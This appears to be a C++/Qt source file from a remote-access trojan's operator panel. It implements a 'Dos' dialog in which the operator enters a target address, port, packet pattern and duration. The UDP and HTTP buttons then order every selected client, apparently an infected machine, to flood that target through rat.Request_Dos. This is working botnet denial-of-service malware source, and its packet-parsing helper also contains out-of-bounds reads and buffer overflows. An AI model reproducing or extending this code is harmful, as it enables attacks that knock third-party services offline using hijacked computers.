#include "dos.h"
#include "ui_dos.h"

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"

extern Ui::MainWindow *mainwin;
extern leyrat rat;

Dos::Dos(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Dos)
{
    ui->setupUi(this);
    this->setWindowTitle("Dos");
    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_2->setFocusPolicy(Qt::NoFocus);
    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);
}

Dos::~Dos()
{
    delete ui;
}

char* interpretinputarg(const char *input, unsigned int *ssize)
{

    unsigned int size = strlen(input);

    char* converted = new char[size];

    unsigned int rawsize = 0;

    unsigned int i = 0;
    for (i = 0; i < size; i++)
    {
        if(input[i-1] != '\\') continue;

        if (input[i] == 'x')
        {
            char hex1 = input[i+1];
            char hex2 = input[i+2];

            char input[2];
            input[0] = hex1;
            input[1] = hex2;
            int data = strtol(input, 0, 16);
            converted[rawsize] = data;
            rawsize = rawsize + 1;
        }

        if(input[i] == 'c')
        {

            unsigned int a = 0;

            for(a=1;a<size-i;a++)
            {

                if(!input[i+a] || input[i+a]=='\\')
                    break;

                converted[rawsize] = input[i+a];
                rawsize = rawsize + 1;
            }

        }

        if(input[i] == 'd')
        {
            int shit = 0;
            char shitstr[10];

            unsigned int a = 0;

            for(a=1;a<size-i;a++)
            {

                if(!input[i+a] || input[i+a]=='\\')
                    break;

                shitstr[shit] = input[i+a];
                shit = shit + 1;
            }
            shitstr[shit] = '\0';

            shit = atoi(shitstr);

            memset(converted+rawsize, '\xFF', shit);

            rawsize = rawsize + shit;


        }
    }


    *ssize = rawsize;
    return converted;
}

void Dos::on_pushButton_2_pressed()//udp
{
    const QByteArray addrbytes = ui->plainTextEdit->toPlainText().toLatin1();
    const char *addr = addrbytes.data();

    short atkport = ui->plainTextEdit_2->toPlainText().toShort();

    const QByteArray pkgbytes = ui->plainTextEdit_3->toPlainText().toLatin1();
    const char *strpkg = pkgbytes.data();


    int time = ui->plainTextEdit_4->toPlainText().toInt();

    if(time<1)
        time = 0;

    unsigned int pkglen;

    char*pkg = interpretinputarg(strpkg, &pkglen);

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Dos(item->text().toStdString().c_str(), addr, pkg, pkglen, time,  atkport, false);

    }

    delete[] pkg;
}

void Dos::on_pushButton_pressed()//http
{
    const QByteArray addrbytes = ui->plainTextEdit->toPlainText().toLatin1();
    const char *addr = addrbytes.data();

    short atkport = ui->plainTextEdit_2->toPlainText().toShort();

    const QByteArray pkgbytes = ui->plainTextEdit_3->toPlainText().toLatin1();
    const char *strpkg = pkgbytes.data();


    int time = ui->plainTextEdit_4->toPlainText().toInt();

    if(time<1)
        time = 0;

    unsigned int pkglen;

    char*pkg = interpretinputarg(strpkg, &pkglen);

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Dos(item->text().toStdString().c_str(), addr, pkg, pkglen, time,  atkport, true);

    }

    delete[] pkg;
}
